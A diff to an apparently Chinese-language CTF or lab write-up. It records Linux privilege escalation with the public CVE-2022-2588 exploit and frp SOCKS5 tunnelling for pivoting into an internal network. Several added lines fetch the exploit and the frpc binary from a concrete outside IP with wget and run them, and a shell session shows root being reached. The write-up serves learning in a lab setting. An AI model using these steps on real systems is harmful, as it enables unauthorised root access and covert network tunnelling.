@@ -106,18 +106,18 @@ flag{Php_Waf_so_insteresting!}
 flag{Php_Waf_so_insteresting!}
 ```
 
-1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传, 靶机执行`wget http://xxx.xxx.xxx.xxx:4444/exp_file_credential
+1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python3 -m http.server 4444`上传, 靶机执行`wget http://101.132.149.233:4444/exp_file_credential
 2. 记得`chmod 777 ./exp_file_credential` ，否则无法执行
 3. 这里不知道为啥第二次才执行成功，提权至root成功
+4. 账号和密码都是`user`
 ```bash
-www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
-total 80
--rw-r--r--  1 www-data www-data 37136 May 29 15:52 exp_file_credential
-www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ chmod 777 ./exp_file_credential
-www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
-total 84
--rwxrwxrwx  1 www-data www-data 37136 May 29 15:52 exp_file_credential
+python3 -m http.server 4444
+wget http://101.132.149.233:4444/exp_file_credential
+chmod 777 ./exp_file_credential
+```
 
+```bash
+www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ chmod 777 ./exp_file_credential
 www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ./exp_file_credential
 self path /tmp/./exp_file_credential
 prepare done
@@ -138,11 +138,10 @@ should be after the slow write
 write done, spent 1.209773 s
 succeed
 www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ su user
-Password: 
+Password: user
 # id
 uid=0(user) gid=0(root) groups=0(root)
 ```
-
 
 ### 查看内网IP
 ```bash
@@ -290,10 +289,6 @@ ufw allow 6000/tcp
 ### frps-阿里云服务端
 ```bash
 ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
-2026-06-01 14:36:45.962 [I] [frps/root.go:108] frps uses config file: ./frps.toml
-2026-06-01 14:36:46.210 [I] [server/service.go:236] frps tcp listen on 0.0.0.0:7000
-2026-06-01 14:36:46.210 [I] [frps/root.go:117] frps started successfully
-2026-06-01 14:36:53.186 [I] [server/service.go:582] [5aee9f15ef905c3b] client login info: ip [39.101.143.209:46064] version [0.65.0] hostname [] os [linux] arch [amd64]
 2026-06-01 14:36:53.215 [I] [proxy/tcp.go:82] [5aee9f15ef905c3b] [plugin_socks5] tcp proxy listen port [6000]
 2026-06-01 14:36:53.215 [I] [server/control.go:399] [5aee9f15ef905c3b] new proxy [plugin_socks5] type [tcp] success
 ```
@@ -365,6 +360,13 @@ bindPort = 7000
 # 如需Socks5穿透，无需额外插件配置，客户端映射即可
 ```
 #### 2. 内网机器 frpc.toml（现有的客户端配置）
+
+下载frpc客户端和配置文件
+````bash
+wget http://101.132.149.233:4444/frpc.toml
+wget http://101.132.149.233:4444/frpc 
+````
+
 当前配置：
 ```
 serverAddr = "101.132.149.233"
